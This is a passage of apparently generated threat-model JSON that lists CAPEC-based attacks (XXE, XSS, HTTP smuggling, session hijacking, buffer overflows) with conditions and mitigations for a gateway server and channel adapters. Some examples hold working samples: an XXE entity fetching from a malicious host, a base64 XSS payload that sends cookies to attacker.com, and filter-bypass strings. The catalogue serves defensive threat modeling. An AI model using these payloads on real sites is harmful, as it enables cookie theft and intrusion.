Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.", "id": "93", "mitigations": "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.Design: Do not rely on client validation or encoding for security purposes.Design: Utilize digital signatures to increase authentication assurance.Design: Utilize two factor authentication to increase authentication assurance.Implementation: Perform input validation for all remote content.", "references": "https://capec.mitre.org/data/definitions/22.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "AA04"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "XML External Entities Blowup", "details": "This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.", "example": "In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>", "id": "94", "mitigations": "This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.", "references": "https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "INP19"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Credential Falsification through Manipulation", "details": "An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.", "example": "An adversary uses client side scripting(JavaScript) to set session ID in the victim's browser using document.cookie. This fixates a falsified session credential into victim's browser with the help of a crafted URL link. Once the victim clicks on the link, the attacker is able to bypass authentication or piggyback off some other authenticated victim's session.", "id": "95", "mitigations": "Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult. Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.", "references": "https://capec.mitre.org/data/definitions/226.html, http://cwe.mitre.org/data/definitions/565.html, http://cwe.mitre.org/data/definitions/472.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "AC11"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "DTD Injection", "details": "An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.", "example": "Adversary injects XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.", "id": "96", "mitigations": "Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.Implementation: Disallow the inclusion of DTDs as part of incoming messages.Implementation: Use XML parsing tools that protect against DTD attacks.", "references": "https://capec.mitre.org/data/definitions/228.html, http://cwe.mitre.org/data/definitions/829.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "INP21"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "XML Attribute Blowup", "details": "This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.", "example": "In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.", "id": "97", "mitigations": "This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.", "references": "https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP22"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "98", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "99", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "SOAP Array Overflow", "details": "An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.", "example": "Refer to this example - http://projects.webappsec.org/w/page/13246962/SOAP%20Array%20Abuse", "id": "100", "mitigations": "If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.", "references": "https://capec.mitre.org/data/definitions/256.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP34"}, {"assumption": null, "condition": "target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False", "cvss": "", "description": "HTTP Response Smuggling", "details": "An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.", "example": "The attacker targets the cache service used by the organization to reduce load on the internet bandwidth. This server can be a cache server on the LAN or other application server caching the static WebPages. The attacker sends three different HTTP request as shown - Request 1: POST request for http://www.netbanking.com, Request 2: GET request for http:www.netbanking.com/FD.html, Request 3: GET request for http://www.netbanking.com/FD-Rates.html. Due to malformed request cache server assumes request 1 and 3 as valid request and forwards the entire request to the webserver. Webserver which strictly follow then HTTP parsing rule responds with the http://www.netbanking.com/FD.html  HTML page. This is happened because webserver consider request 1 and 2 as valid one. Cache server stores this response against the request 3. When normal users request for page http://www.netbanking.com/FD-Rates.html, cache server responds with the page http://www.netbanking.com/FD.html.Hence attacker will succeeds in cache poisoning.", "id": "101", "mitigations": "Design: Employ strict adherence to interpretations of HTTP messages wherever possible.Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.", "references": "https://capec.mitre.org/data/definitions/273.html", "response": "", "severity": "Medium", "target": "Gateway WS/HTTP Server", "threat_id": "INP36"}, {"assumption": null, "condition": "target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False", "cvss": "", "description": "HTTP Request Smuggling", "details": "HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.", "example": "When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088", "id": "102", "mitigations": "HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.", "references": "https://capec.mitre.org/data/definitions/33.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "INP37"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Credential Falsification through Prediction", "details": "This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.", "example": "Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534", "id": "103", "mitigations": "Use a strong source of randomness to generate a session ID.Use adequate length session IDs. Do not use information available to the user in order to generate session ID (e.g., time).Ideas for creating random numbers are offered by Eastlake [RFC1750]. Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.", "references": "https://capec.mitre.org/data/definitions/59.html", "response": "", "severity": "High", "target": "Gateway WS/HTTP Server", "threat_id": "AC16"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Hijacking - ServerSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "104", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "Gateway WS/HTTP Server", "threat_id": "AC17"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "Overflow Buffers", "details": "Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.", "example": "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.", "id": "105", "mitigations": "Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.", "references": "https://capec.mitre.org/data/definitions/100.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html", "response": "", "severity": "Very High", "target": "Channel Adapters", "threat_id": "INP02"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Authentication Abuse/ByPass", "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "106", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "AA01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "107", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "108", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.usesSecureFunctions is False", "cvss": "", "description": "Buffer Manipulation", "details": "An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.", "example": "Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.", "id": "109", "mitigations": "To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.", "references": "https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html", "response": "", "severity": "Very High", "target": "Channel Adapters", "threat_id": "INP07"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "110", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "111", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "112", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False and target.controls.validatesInput is False", "cvss": "", "description": "Client-side Injection-induced Buffer Overflow", "details": "This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.", "example": "Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.", "id": "113", "mitigations": "The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP12"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Command Delimiters", "details": "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.", "example": "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.", "id": "114", "mitigations": "Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.", "references": "https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html", "response": "", "severity": "High", "target": "Channel Adapters", "threat_id": "INP13"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Input Data Manipulation", "details": "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.", "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.", "id": "115", "mitigations": "Validation of user input for type, length, data-range, format, etc.", "references": "https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Medium", "target": "Channel Adapters", "threat_id": "INP14"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this 